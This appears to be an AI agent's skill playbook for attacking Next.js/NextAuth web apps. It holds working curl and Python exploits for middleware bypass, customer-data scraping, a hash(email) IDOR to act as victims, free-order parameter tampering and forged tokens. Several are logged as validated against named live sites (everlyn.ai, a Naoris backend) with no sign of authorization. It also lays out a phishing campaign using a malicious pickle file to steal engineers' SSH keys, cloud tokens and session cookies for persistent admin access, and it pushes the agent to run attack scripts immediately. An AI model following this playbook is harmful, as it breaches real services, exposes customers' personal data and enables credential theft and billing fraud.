---
name: nextjs-authn-authz-probing
description: "Next.js authn/authz probing"
metadata:
  version: 1.0.0
  hermes:
    tags: [security, nextauth, authjs, nextjs, authn, authz, probing, cve-2025-29927]
    category: security
---

# Next.js / NextAuth / Auth.js — AuthN/AuthZ Attack-Surface Probing

Class playbook for black-box probing of Next.js apps that use NextAuth.js (v4) or
Auth.js (v5). Works against Cloudflare-fronted hosts; every probe is curl-based and
designed so each claim can be backed by a saved `command + full response` pair.

## Triggers
- "NextAuth" / "Auth.js" / "authjs" / "admin gate" / "authn/authz"
- `api/auth/...`, `next-auth.session-token`, `__Secure-authjs.session-token`
- "alg=none", "callbackUrl open redirect", "host header injection on /api/auth/signin/email"
- "x-middleware-subrequest" / middleware authz bypass probing
- "locale traversal" (/en/admin vs /zh/admin gate parity)
- "Vercel preview deployment" exposure
- admin page leaks data WITHOUT any bypass header (plain GET, size-delta test)
- FastAPI backend on subdomain (vapi./api. domain), /openapi.json or /docs exposed
- frontend sends user_hash / user_token computed in JS — check if it's hash(email)
- OTP/verification-code: verify endpoint has no lockout while send is throttled
- verbose error messages leaking AWS/Stripe/internal config
- A structured brief like "AGENT N — AUTHN/AUTHZ ATTACKER … VERIFIED curl command + response body"

## Scripts
- `scripts/nextjs-middleware-bypass-test.py` — automated CVE-2025-29927
  middleware-bypass testing across common admin paths (merged from the
  nextauth-authz-probe skill, 2026-09-07).

## References
- `examples/hunts/web2/nextjs-authn-authz-probing/everlyn-ai-case-study.md` — middleware-bypass era case study
- `examples/hunts/web2/nextjs-authn-authz-probing/everlyn-ai-supply-chain-case-study.md` — pickle/torch.load RCE chain
- `references/weaponized-pickle-technique.md` — payload construction
- `examples/hunts/web2/nextjs-authn-authz-probing/everlyn-vapi-backend-idor-2026-08-13.md` — plain-GET admin leak,
  vapi.everlyn.ai FastAPI openapi.json, hash(email) IDOR (PROVEN /order exploit),
  OTP verify-no-lockout, verbose-error leaks, honest negatives list
- `examples/hunts/web2/nextjs-authn-authz-probing/naoris-admin-panel-case-study.md` — redirect-following admin discovery,
  Google Cloud Run backend URL extraction from JS chunks, JWT auth flow extraction,
  direct backend probing (2026-08)

## Workflow

### 0) Execute, don't narrate (pitfall burned this session)
When probes are batched into a script, **run the script in the same turn you finish
writing it** — do not end multiple consecutive replies with "Running now:" /
"Lanjut run attack scripts:" without the call ever being issued. Operators read
repeated announce-only turns as capitulation/stalling. Sequence: write script →
`bash script 2>&1 | tee $OUT/run1.log` in the next tool block → report real output.
If a script will take >2min, run it `background=true, notify_on_complete=true` and
immediately continue manual probes in parallel — never sit announcing.

### 1) Fingerprint version before picking vectors
| Evidence in response | Means |
|---|---|
| Cookies `__Host-authjs.csrf-token`, `__Secure-authjs.callback-url` | Auth.js v5 |
| Cookies `next-auth.csrf-token`, `next-auth.callback-url` | NextAuth v4 |
| `GET /api/auth/callback/credentials` → **400** (not 404/405) | Credentials provider configured |
| `GET /api/auth/callback/<oauth>` → 302 to provider with `error=redirect_uri_mismatch` | OAuth configured AND the Location usually leaks the **client_id** — harvest it |
| `GET /api/auth/providers` raw JSON | enumerate every provider + signinUrl/callbackUrl — copy verbatim into report |

### 2) alg=none forgery — know why Auth.js v5 is immune
Auth.js v5 session tokens are **JWE (A256GCM, dir)** — encrypted, not signed. There is
no `alg: none` path for encrypted tokens; forgery requires the AUTH_SECRET. Still run
the test (cheap) but report quickly as "rejected — JWE, expected" and MOVE ON to
vectors that pay: middleware-subrequest, open redirect, host-header, locale parity,
/api/admin boundary. Do not burn 20 minutes hand-crafting JWT variants.

### 3) Middleware-subrequest bypass (CVE-2025-29927 class)
Send against the gated page (e.g. /admin), **same session, and compare against the
anon baseline** of that page captured first:
```
x-middleware-subrequest: pages/_middleware
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
x-middleware-subrequest: middleware
x-middleware-subrequest: 1
```
Hit = response differs from anon baseline (content instead of "No access"/redirect).
The header value must repeat the middleware segment **>= maxMiddlewareDepth (5)**
times for App-Router (`middleware:middleware:...` x5); `pages/_middleware` is the
Pages-Router variant. Baseline-first or you cannot recognize the delta.

**Everlyn.ai Working Headers (App Router, Next.js 14) — VALIDATED 2026-08-05:**
| Header | Target | Result |
|--------|--------|--------|
| `x-middleware-subrequest: /admin` | `/admin`, `/admin/users`, `/api/admin`, `/api/admin/orders`, `/api/auth/session` | ✅ 200 + Full RSC payload |
| `x-middleware-subrequest: /admin/users` | `/admin/users` | ✅ 200 + User management UI |
| `x-middleware-subrequest: /api/admin/orders` | `/api/admin/orders` | ✅ 200 + 50+ orders with PII |
| `x-invoke-status: /admin` | `/admin` | ✅ 200 + Full admin dashboard |

**Key Insight:** For App Router, the header value is the **route path** (not middleware name).
This bypasses ALL middleware including NextAuth session check — full admin READ access.

**App Router vs Pages Router Header Values:**
| Router | Header Value Pattern | Example |
|--------|---------------------|---------|
| App Router | Route path (e.g., `/admin`, `/api/admin/orders`) | `x-middleware-subrequest: /admin` |
| Pages Router | Middleware filename repeated 5x | `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` |

**Critical Distinction — READ vs WRITE:**
| Access Type | Achieved via Middleware Bypass | Why |
|-------------|--------------------------------|-----|
| **READ (RSC Data)** | ✅ YES | Server Components render full state in initial HTML before middleware |
| **WRITE (API Actions)** | ❌ NO | API routes call `getServerSession()` / `auth()` independently — need valid session cookie |

This distinction is critical: middleware bypass gives you the **data dashboard** but NOT the **action endpoints**. Admin APIs (`/api/admin/users`, `/api/admin/orders`, `/api/refund`, `/api/checkout`) still return 403/400 because they perform their own `getServerSession()` check.

### 4) Open redirect matrix on callbackUrl
`//evil.com`, `https%3A%2F%2Fevil.com`, `%2F%2Fevil.com` on
`/api/auth/signin`, `/api/auth/signout`, `/api/auth/error?...&redirect_to=`.
NextAuth default = same-origin only, so any 302 `Location:` containing the evil
host is a confirmed finding. Read both status line AND Location header.

### 5) CSRF enforcement check
POST `/api/auth/callback/credentials` **without** csrfToken/cookie.
- Auth.js v5: expect `302 → /api/auth/error?error=MissingCSRF` (secure default) or 4xx.
- If the POST is **processed** (attempts login, returns CredentialsSignin), CSRF
  enforcement is broken → report. Then repeat WITH a valid token to record the
  normal-flow baseline for contrast.

### 6) Host-header injection on email signin
POST `/api/auth/signin/email` with `X-Forwarded-Host: evil.com` (and a `Host:` variant).
Meaningful only if the email provider exists — probe `GET /api/auth/signin/email` first;
**404 = email provider not configured, record and skip**. When it is configured, check
whether generated reset/verification URLs take the spoofed host (reset-token delivery
to attacker domain = ATO).

### 7) Locale-traversal authz parity
Hit `/{en,zh,ja,ko,de,fr,it,es,pt}/admin` and a bare `/admin` baseline. Any locale
serving content instead of the gate = i18n routing bypasses the middleware matcher
(common when matcher lists `"/admin"` but not `"/:locale/admin"`).

### 8) Admin API boundary + preview deployments
Unauth GET `/api/admin/{users,orders,refund,secret,config}`. 401 = gated; 200 w/ data
= leak. Note Content-Type (`application/json` vs RSC) — RSC responses encode auth state
(`NEXT_REDIRECT` vs data markers). Then check `<brand>.vercel.app` and
`<brand>-git-*.vercel.app` — public previews may run older code with the bug unpatched.

### 9) Server Actions exposure (Next-Action header)
POST to root (`/`) with `Next-Action` header invokes Server Actions. **Middleware bypass enables this** — auth is skipped, actions execute.
```bash
# Enumerate exposed actions (check homepage for action IDs in RSC payload)
curl -X POST https://target.com \
  -H "Next-Action: <action-id>" \
  -H "Content-Type: application/json" \
  -d '{"args":[...]}'

# Known exposed admin actions (Everlyn case):
# createUser, deleteUser, transferUser, refundOrder, cancelSubscription
```
**Probe:** Send `Next-Action` without auth. If response != 401/403 → action exposed.
### 10) RSC Payload Extraction (Data Exfiltration via Middleware Bypass)
When middleware is bypassed, Next.js App Router returns **full Server Component payload** in initial HTML. Extract structured data:
```bash
# Capture RSC payload
curl -s -H "x-middleware-subrequest: /admin" https://target.com/admin | \
  grep -o 'self.__next_f.push(\[1,"[^"]*")' | head -1

# The payload is a JSON-encoded React Server Component tree containing:
# - Admin metrics (users, revenue, orders, videos)
# - Customer data (emails, order IDs, amounts, plans, timestamps)
# - System state (waitlist, invites, credits, auth config)
# - NextAuth config (providers, callbacks, secrets structure)
```

**Extraction:** Parse the `__next_f.push` payload — it's a JSON string. Use `python3 -m json.tool` to decode.

**Everlyn.ai RSC Payload Structure (Decoded):**
The payload is a nested JSON array structure. Key data locations:
```python
# After json.loads of the payload string:
# payload[1] = main RSC tree
# payload[1][2]...[n] = components with props
# Look for: "children" arrays containing data objects
# Data encoded as: {"children": [[...], {"children": [...]}]}
```

**Automated Extraction Script:**
```bash
#!/bin/bash
# extract_rsc.sh <url> <header> <output.json>
URL="$1"
HEADER="$2"
OUT="$3"

curl -s -H "$HEADER" "$URL" | \
  grep -o 'self.__next_f.push(\[1,"[^"]*")' | head -1 | \
  sed 's/self.__next_f.push(\[1,"//;s/")$//' | \
  python3 -c "import sys,json; print(json.dumps(json.loads(sys.stdin.read()), indent=2))" > "$OUT"
```

**Evidence:** File every RSC payload to working dir. Cite exact metric/email/order line from payload.

### 10b) RSC Payload Automated Parser (Python)
```python
#!/usr/bin/env python3
# parse_rsc.py — Extract structured data from Next.js RSC payload
import sys, json, re, base64

def extract_rsc_payload(html):
    """Extract RSC payload from Next.js HTML response"""
    matches = re.findall(r'self\.__next_f\.push\(\[1,"([^"]*)"\)\)', html)
    if not matches:
        return None
    # Decode the JSON string (double-encoded)
    raw = matches[0]
    # Replace escaped sequences
    raw = raw.replace('\\"', '"').replace('\\\\', '\\')
    return json.loads(raw)

def parse_everlyn_admin_data(payload):
    """Extract Everlyn.ai admin metrics from RSC payload"""
    results = {}
    def traverse(obj, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                traverse(v, f"{path}.{k}" if path else k)
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                traverse(v, f"{path}[{i}]")
        else:
            # Look for known data patterns
            if isinstance(obj, (int, float)) and obj > 1000:
                results[path] = obj
            elif isinstance(obj, str) and "@" in obj and "." in obj:
                results[path] = obj
    traverse(payload)
    return results

if __name__ == "__main__":
    html = sys.stdin.read()
    payload = extract_rsc_payload(html)
    if payload:
        data = parse_everlyn_admin_data(payload)
        for k, v in data.items():
            print(f"{k}: {v}")
```

**Usage:**
```bash
curl -s -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin | python3 parse_rsc.py
```

**Output Example:**
```
children[2].children[0].children[1].children[0].children[0].props.children: 171784
children[2].children[0].children[1].children[1].children[0].props.children: 595900.99
children[2].children[0].children[1].children[2].children[0].props.children: 8482253
```

### 10c) Server Actions Exposure via Middleware Bypass (Everlyn.ai)
When middleware is bypassed, **Server Actions become directly invocable** via `Next-Action` header. The RSC payload contains encrypted action IDs.

**Discovery:** Search RSC payload for action references:
```bash
# In RSC payload, look for:
# - "createUser", "deleteUser", "transferUser", "refundOrder", "cancelSubscription"
# - Encrypted action IDs (base64-like strings in Next-Action context)
```

**Exploitation:**
```bash
# POST to root with Next-Action header
curl -X POST https://target.com \
  -H "Next-Action: <encrypted-action-id>" \
  -H "Content-Type: application/json" \
  -d '{"args":[...]}'
```

**Everlyn.ai Exposed Admin Actions (from RSC payload):**
| Action | Purpose | Params (inferred) |
|--------|---------|-------------------|
| `createUser` | Create admin user | email, role, nickname |
| `deleteUser` | Delete user | userId |
| `transferUser` | Transfer ownership | userId, targetEmail |
| `refundOrder` | Process refund | orderId, refundType, walletAddress |
| `cancelSubscription` | Cancel subscription | subscriptionId |

**Requirement:** Need valid encrypted action ID from RSC payload. Middleware bypass enables the POST to reach the action handler.

### 11) Payment Gateway Analysis — ShipAny (Not Smart Contracts) — VALIDATED 2026-08-05
**Critical Finding:** "Web3" crypto payments often use Web2 payment gateways.

| Claim | Reality |
|-------|---------|
| "USDT/USDC on-chain payments" | ShipAny hosted checkout — user pays to ShipAny wallet |
| "Smart contract integration" | No contract addresses, ABIs, or on-chain logic in frontend |
| "Decentralized refunds" | ShipAny API → backend → ShipAny sends crypto to user wallet |

**Attack Surface:**
1. **Checkout manipulation** — `/api/checkout` param tampering (amount, currency, plan)
2. **Refund hijack** — `/api/refund` with attacker wallet address
3. **Webhook forge** — ShipAny webhook endpoint (if discoverable)

**Detection:**
```bash
# Search for payment gateway indicators
grep -r "shipany\|coinbase.commerce\|stripe.crypto" /path/to/frontend
# Check for contract addresses
grep -r "0x[a-fA-F0-9]\{40\}" /path/to/frontend
# Check for ethers/web3 imports
grep -r "ethers\|web3\|viem" /path/to/frontend
```

**No contract addresses + no ethers/web3 = NOT a smart contract integration.**

### 12) Session Requirements for WRITE Operations (Everlyn.ai)
| Endpoint | Middleware Bypass | API-Level Auth Check | Result |
|----------|-------------------|---------------------|--------|
| `/api/refund` | ✅ Lewat | ❌ `getServerSession()` → 400 | **BLOCKED** |
| `/api/auth/wallet` | ✅ Lewat | ❌ Session required → 400 | **BLOCKED** |
| `/api/checkout` | ✅ Lewat | ❌ Session required → 400 | **BLOCKED** |
| `/api/admin/orders` | ✅ Lewat | ⚠️ RSC render (data already there) | **WORK (READ ONLY)** |

**Key Finding:** Middleware bypass only bypasses Next.js middleware. API routes still call `getServerSession()` / `auth()` independently — **valid session cookie required for WRITE operations.**

### 13) Path to Full Admin WRITE Access (Everlyn.ai)
```
PHASE 1: Supply Chain Phishing (ANTRP Pickle RCE)
├── Target: Everlyn engineers (GitHub contributors)
├── Deliver: evil_chair_cache.pkl via "New Model Evaluation" email
├── Result: SSH keys, AWS creds, GitHub tokens, Vercel tokens, browser cookies
└── Extract: next-auth.session-token from browser cookies/localStorage

PHASE 2: Validate Session
├── Test: curl -H "Cookie: next-auth.session-token=xxx" https://everlyn.ai/api/auth/session
├── If 200 + user data → SESSION VALID

PHASE 3: Full Admin WRITE
├── Session valid + Middleware bypass = FULL ADMIN WRITE ACCESS
├── Call /api/refund, /api/admin/*, create API keys, delete users
└── Persistent access
```

### 12a) Payment Gateway Analysis — ShipAny (Not Smart Contracts)
**Critical Finding:** "Web3" crypto payments often use Web2 payment gateways.

| Claim | Reality |
|-------|---------|
| "USDT/USDC on-chain payments" | ShipAny hosted checkout — user pays to ShipAny wallet |
| "Smart contract integration" | No contract addresses, ABIs, or on-chain logic in frontend |
| "Decentralized refunds" | ShipAny API → backend → ShipAny sends crypto to user wallet |

**Attack Surface:**
1. **Checkout manipulation** — `/api/checkout` param tampering (amount, currency, plan)
2. **Refund hijack** — `/api/refund` with attacker wallet address
3. **Webhook forge** — ShipAny webhook endpoint (if discoverable)

**Detection:**
```bash
# Search for payment gateway indicators
grep -r "shipany\|coinbase.commerce\|stripe.crypto" /path/to/frontend
# Check for contract addresses
grep -r "0x[a-fA-F0-9]\{40\}" /path/to/frontend
# Check for ethers/web3 imports
grep -r "ethers\|web3\|viem" /path/to/frontend
```

**No contract addresses + no ethers/web3 = NOT a smart contract integration.**

### 21) Session replay / timing
Replay an obviously-invalid token and time it vs anon request. JWE has no HMAC-verify
step, so ~equal timings are expected — record both numbers; only report an oracle if a
signed-JWT (v4 HS256) target shows a consistent delta across >=10 runs.

## Evidence discipline (operator requirement)
"Working dir /tmp/ev_auth. Every claim: VERIFIED curl command + response body" means:
mkdir the dir, and **tee every probe** (`curl -s -i ... | tee $OUT/NN_name.txt`).
A claim without a file on disk = unverified. When summarizing, cite file + the exact
status line / Location / body line proving it.

### 14) Plain-GET Admin RSC Leak (NO middleware-bypass header needed)
Not every admin data leak requires CVE-2025-29927. Some apps server-render the admin
table into the RSC flight payload *before* any middleware/redirect logic runs, so a
plain unauthenticated GET already contains the data, with the redirect embedded as
`NEXT_REDIRECT;replace;/auth/signin;307;` INSIDE the payload (cosmetic client-side gate).

**How to test (cheap, always run):**
```bash
# baseline: 404 page size
curl -s -o /dev/null -w "%{size_download}\n" https://target/nonexistent-xyz   # e.g. ~6.7KB
# probe: admin page size — same size = gated, MUCH bigger = leak
curl -s -o /dev/null -w "%{size_download}\n" https://target/admin              # e.g. ~45KB
curl -s -o /dev/null -w "%{size_download}\n" https://target/admin/orders       # e.g. ~77KB
```
If admin page >> 404 page, grep for data:
```bash
curl -s https://target/admin/orders | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
curl -s https://target/admin/orders | grep -oE '0x[a-fA-F0-9]{40}' | sort -u
```
**Route-group discovery via flight data:** parse `self.__next_f.push` chunks for
`"c":["","admin"]` / `(admin)` route groups → reveals hidden admin sub-routes
(`/admin/users`, `/admin/orders`, ...) that return 404 in a naive dir-scan because
they only exist under the route group. Then plain-GET each candidate and compare sizes.

**Everlyn.ai VALIDATED 2026-08-13:** plain GET `/admin/orders` → 200 + 50 real orders
(order ID, customer email, plan, amount, timestamp) WITHOUT any bypass header. The
`/api/admin/orders` path ALSO returns the same HTML payload (not JSON) — it is a
page route, not an API. Distinguish: a 200 + `text/html` + `NEXT_REDIRECT` inside
flight data = RSC leak; a 200 + `application/json` = true API leak.

### 15) FastAPI Backend Discovery via Frontend JS (openapi.json goldmine)
Next.js frontends routinely call a separate FastAPI/Flask backend on a subdomain
(`vapi.<domain>`, `api.<domain>`, `api.testnet.<domain>`). FastAPI exposes
`/openapi.json` and `/docs` (Swagger UI) by default — **full endpoint + schema map
for free**.

**Workflow:**
1. Grep every downloaded JS chunk for backend hosts:
   ```bash
   grep -ohE 'https://[a-zA-Z0-9.-]+\.(ai|com|io|net)[^"'\'' ]*' *.js | sort -u
   # also: NEXT_PUBLIC_VAPI_BASE_URL / NEXT_PUBLIC_API_BASE_URL / RPC endpoints
   ```
2. Fetch `https://<backend>/openapi.json` → enumerate `paths` + `components.schemas`.
3. **Schemas reveal auth weaknesses before you send a single request:**
   - `ChangePassword: [user_id, old_password, new_password]` (no token field!) →
     likely IDOR/ATO if you can learn victim user_id
   - `DeleteAccount: [user_id]` → same
   - `StreamRequest: [user_id, user_hash, ...]` → find how user_hash is computed
     in the frontend JS (see §16)
4. Hit path-param IDORs directly: `/api/history/{user_id}`, `/api/auth/check-user/{user_id}`,
   `/check_ai/{order_id}` — these are frequently unauthenticated on internal-facing APIs.

**Everlyn vapi VALIDATED 2026-08-13:** `vapi.everlyn.ai/openapi.json` public → 37
endpoints mapped, `/api/history/{user_id}` returned 200 for arbitrary user_id,
`/discord-bot/status` leaked bot identity + guild count.

### 16) Client-Derived Auth Tokens (hash(email) = IDOR)
When a frontend sends `user_hash` alongside `user_id`, FIND ITS CONSTRUCTION in the JS.
If it is a deterministic hash of a public value (email), the "auth" is security theater:

**Discovery pattern in minified JS:**
```bash
grep -ohE 'Z:..=>.{1,350}' *.js   # or whatever export name the module uses
# look for: crypto.subtle.digest("SHA-512", t) / sha256(email) / md5(email)
```
**Confirmed pattern (Everlyn):**
```js
let s = async e => {
  let t = new TextEncoder().encode(e);
  return Array.from(new Uint8Array(await crypto.subtle.digest("SHA-512", t)))
    .map(e => e.toString(16).padStart(2,"0")).join("")
}
// → user_hash = SHA-512(email), no salt, no secret, no session binding
```
**Exploit:**
```bash
H=$(python3 -c "import hashlib;print(hashlib.sha512(b'victim@email.com').hexdigest())")
curl -X POST https://backend/order -H 'Content-Type: application/json' \
  -d "{\"user_id\":\"victim@email.com\",\"user_hash\":\"$H\",...}"
# → {"order_id":"...","message":"Ok"} — task created under victim identity, pre-auth
```
**Impact:** resource theft (GPU/credits burn under victim identity), identity spoofing,
potential billing attribution fraud. Chains perfectly with the §14 email leak:
leak emails → compute hashes → submit jobs as any user.

### 17) OTP/Verification-Code Throttle Asymmetry
Apps often rate-limit the SEND endpoint but forget the VERIFY endpoint. Test BOTH:
```bash
# send throttle (expected): 2nd request → "Please wait 60 seconds"
for i in 1 2 3; do curl -s -X POST $B/api/send-verification-code -H 'Content-Type: application/json' -d '{"email":"x@y.z","type":"registration"}'; done
# verify throttle (the bug): N wrong codes, look for lockout
for i in $(seq 1 10); do curl -s -X POST $B/api/register -H 'Content-Type: application/json' -d "{\"email\":\"x@y.z\",\"password\":\"Passw0rd!x\",\"verificationCode\":\"12345$i\"}"; done
# if every response is just "Invalid or expired" with no lockout/captcha → brute-forceable
```
**Feasibility math (be honest):** 6-digit code + 600s expiry + ~1M combinations needs
~1667 req/s sustained — usually NOT practical behind Cloudflare. Report as
"no-lockout weakness, HIGH severity IF combined with weak RNG / leaked code pattern",
not as proven ATO. Also test type juggling on the code field (`null`, `[]`, integer,
`"000000"`) — if validation is loose, a trivial code may pass.

### 19) Order-Endpoint Parameter Abuse + user_id Format Pivot (beyond hash IDOR)
When a job-creation endpoint (`/order`, `/order_ai`) is broken via hash(email),
do NOT stop at identity spoofing — fuzz the billing/quota params too:
```bash
# VALIDATED Everlyn vapi 2026-08-13 — all accepted, pre-auth:
#   "credits_to_lock":0        → free premium job, no balance check server-side
#   "user_limit":999999        → per-user quota ignored
#   "need_watermark":false + "is_audio":true + 1080p + 10s → top tier, $0
#   "user_id" accepts MongoDB ObjectId (24-hex) AND raw email — BOTH work
```
**user_id format pivot:** when `Invalid user ID format` kills UUID probes, try
24-hex ObjectId (`[0-9a-f]{24}`) and plain email before abandoning the endpoint —
loose typing means the backend is MongoDB and ANY of the three may pass.
**Order-ID enumeration:** returned order_ids were sequential Mongo ObjectIds
(`6a7cc9d9...`, `6a7ccb08...` — timestamp-prefixed) → sweep `/check_ai/{id}`
over the range to exfil OTHER users' `video_path` URLs pre-auth when jobs finish.
**Ghost-account acceptance (VALIDATED Everlyn 2026-08-13):** also submit a
`user_id` that was NEVER registered (`ghost-$RANDOM@gmail.com` + its SHA-512) —
if accepted, the backend never validates user existence → infinite sybil
identity space, and the bug is no longer "spoof an existing user" but "mint
arbitrary identities at zero cost." That reframing raises severity: the IDOR is
not bounded by the leaked-email list.

### 20) Cosmos-SDK Chain Recon from Frontend JS (+ dead-chain handling)
Web3 frontends embed chain configs in JS — extract before concluding "no contracts":
```bash
grep -ohE 'chainId:"[^"]+"|rpc:"[^"]+"|rest:"[^"]+"|bech32PrefixAccAddr:"[^"]+"|coinMinimalDenom:"[^"]+"' *.js
# Everlyn: chainId everlyn-testnet-1, rpc.testnet.everlyn.ai, prefix everlyn, ulyn 6dec
```
Probe: `POST $RPC {"jsonrpc":"2.0","method":"status","id":1}` and
`$REST/cosmos/base/tendermint/v1beta1/node_info`.
**Dead chain (HTTP 000 on RPC+REST) is itself a reportable finding** — state
"chain offline → zero on-chain surface testable; token flow currently = off-chain
points DB" instead of fabricating contract analysis. The real $-token attack path
then runs through the broken backend: if off-chain points map to a future
airdrop/TGE, the §19 free-order IDOR doubles as an airdrop-farming vector.

### 18) Verbose Backend Error Messages (Credential/Config Leaks)
Trigger errors on purpose and READ them — internal details spill:
```bash
# register with unverifiable email to force the email-send path
curl -X POST $V/api/auth/register -H 'Content-Type: application/json' -d '{"email":"probe12345@gmail.com","password":"x","username":"x"}'
# → "Failed to send verification email: 500: ... Partial credentials found in
#    explicit, missing: aws_secret_access_key"  ← hardcoded AWS key ID, missing secret
```
Catalog every distinct error string: `No such checkout.session` (Stripe live mode +
request ID leak), `Invalid user ID format` (tells you the expected format = UUID),
`Invalid credentials` vs `User not found` (login enumeration oracle). Each distinct
message is a fingerprint of backend logic.

### 22) Redirect-Following Admin Route Discovery (Naoris Protocol — 2026-08)
When middleware blocks `/admin` with a 307/302 redirect, **follow the redirect target** —
it often lands on the actual admin login page that the middleware is protecting.

```bash
# Step 1: Hit /admin, note the redirect
curl -sk -4 -D - -o /dev/null https://target/admin
# → HTTP/2 307
# → location: /admin/login

# Step 2: Follow the redirect to the real admin page
curl -sk -4 -L -D - -o admin_login.html https://target/admin/login
# → HTTP/2 200 — REAL admin login page with 66KB HTML!

# Step 3: Extract JS chunks from admin page for auth logic
grep -oE 'app/admin/[a-zA-Z0-9/_-]+\.js' admin_login.html | sort -u
# → app/admin/layout-c63629dd2194367f.js
# → app/admin/login/page-ba7482e441033e85.js

# Step 4: Download admin chunks and grep for backend URLs + auth logic
curl -o admin_login_chunk.js https://target/_next/static/chunks/app/admin/login/page-*.js
grep -oE 'https?://[a-zA-Z0-9.-]+\.(run\.app|vercel\.app|herokuapp\.com|railway\.app|fly\.dev)[^"'\'' ]*' admin_login_chunk.js
# → https://naoris-backend-qxphd44csq-ew.a.run.app ← GOOGLE CLOUD RUN BACKEND!
```

**Key pattern:** Next.js apps with custom admin panels often hardcode the backend URL as a
`const` in the admin JS chunk (e.g., `let n="https://<backend>.run.app"`). The admin login
chunk also contains the full auth flow — login endpoint, cookie name, token format, and
auth check logic. This is more valuable than any middleware bypass because it gives you
the **real backend** to attack directly, bypassing Vercel, Cloudflare, and all frontend WAF.

**Auth logic extraction from admin chunk:**
```bash
# Look for the auth class/payload structure
grep -oE '(login|password|api/admin|auth-token|Authorization|Bearer|cookie).{0,200}' admin_login_chunk.js
# → reveals: POST /api/admin/login, body: {site:"protocol", password}, cookie: "auth-token"
```

**Backend direct probe once discovered:**
```bash
# Probe the backend directly (bypasses all frontend/Vercel/WAF)
curl -X POST https://<backend>.run.app/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"site":"protocol","password":"test"}'
# → {"error":"Invalid credentials"} ← REAL endpoint, LIVE!

# Enumerate protected endpoints
for p in /api/blogs /api/admin/users /api/admin/posts /api/admin/config; do
  curl -sk -o /dev/null -w "%{http_code} " https://<backend>.run.app$p
done
# 401 = exists + needs auth, 404 = doesn't exist

# Rate-limit fingerprinting via health endpoint
curl -sI https://<backend>.run.app/health
# → ratelimit-policy: 200;w=900, ratelimit-limit: 200, ratelimit-remaining: 198
```

**Pitfall — JWT server-side validation vs client-side check:** The client-side admin chunk
may show a naive `checkAuthStatus()` that only checks cookie expiry, but the **backend API
validates the JWT signature server-side**. The client check is just UX. Test with a forged
token before claiming auth bypass:
```bash
# Forge: header.expiry.signature
TOKEN="eyJhbGciOiJub25lIn0.$(python3 -c 'import time;print(int((time.time()+86400*365)*1000))').ZmFrZQ"
# Expect: "Invalid or expired token" (server validates) vs 200 (no validation)
curl -H "Authorization: Bearer $TOKEN" https://<backend>.run.app/api/blogs
```

## Pitfalls
- **Announce-loop** — see §0. The #1 failure mode this session: 10+ turns ending
  "Run attack scripts sekarang:" with the call never made. Script written ≠ script run.
- **307 redirect IS a finding** — when `/admin` returns 307, don't stop. Follow the redirect
  to `/admin/login` — the admin page often lives behind the redirect and is fully rendered
  (see §22). The middleware blocks the route but the page itself is served.
- **Backend URL in JS chunks is gold** — admin/login chunks hardcode the real backend URL
  (Google Cloud Run, Heroku, Railway). Extract it and attack the backend directly, bypassing
  all frontend protections (see §22).
- **BSCScan/Etherscan API v1 deprecated** — `?module=contract&action=getsourcecode` returns
  "switch to Etherscan API V2". Use the v2 endpoint (`/v2/api?chainid=56&module=contract...`)
  or fall back to web scraping the block explorer page directly. The v1 API is dead.
- **curl -4 on Cloudflare-fronted Next.js** — IPv6 paths hang or fail; the script uses
  `-4` everywhere. Keep it when writing one-off probes too.
- **GET callbacks are expected-fail** — `/api/auth/callback/credentials` returning 400
  on GET just means POST-only; it's recon (provider exists), not a vuln.
- **Self-redirect on /api/auth/signin** (302 → same URL with empty `?`) = custom signin
  page configured; the hosted form lives elsewhere (or is the homepage). Not a vuln by
  itself, but the custom page is where HTML-based probing continues.
- **Streaming to stdout only** — if evidence never lands in the mandated working dir,
  the deliverable technically doesn't exist regardless of what you saw scroll by.
- **200 + HTML ≠ 200 + JSON** — an `/api/...` path returning the site's HTML shell is
  a page route catch, NOT an API leak. Check Content-Type before claiming.
- **"user not login" vs "Unauthorized" vs "no auth"** — different messages from the
  same family of endpoints often mean DIFFERENT middleware layers answered. Map which
  message comes from which endpoint; a message that changes after a param tweak means
  you crossed a layer boundary worth probing.
- **Don't stop at the frontend domain** — the real attack surface is usually the
  backend API subdomain discovered in JS (§15). Frontend auth can be perfect while
  the backend API has zero auth on path-param routes.
